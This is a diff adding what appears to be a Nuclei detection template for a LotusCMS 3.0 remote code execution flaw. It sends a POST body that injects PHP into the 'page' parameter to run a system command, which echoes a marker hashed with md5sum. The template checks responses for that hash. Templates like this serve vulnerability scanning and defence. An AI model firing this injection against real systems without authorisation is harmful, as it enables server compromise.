@@ -1,0 +1,38 @@
+http:
+- body: 'page=index'');${system(''echo lotuscms_rce | md5sum'')};#
+
+    '
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  matchers:
+  - part: body
+    type: word
+    words:
+    - 38ee63071a04dc5e04ed22624c38e648
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: POST
+  path:
+  - '{{BaseURL}}/index.php'
+  - '{{BaseURL}}/lcms/index.php'
+id: lotuscms-rce
+info:
+  author: pikpikcu
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  description: 'LotusCMS 3.0 is susceptible to remote code execution via the Router
+    () function. This is done by embedding PHP code in the ''page'' parameter, which
+    will be passed to a eval call and allow remote code execution.
+
+    '
+  metadata:
+    max-request: 2
+  name: LotusCMS 3.0 - Remote Code Execution
+  reference:
+  - https://github.com/Hood3dRob1n/LotusCMS-Exploit
+  severity: critical
+  tags: lotuscms,rce
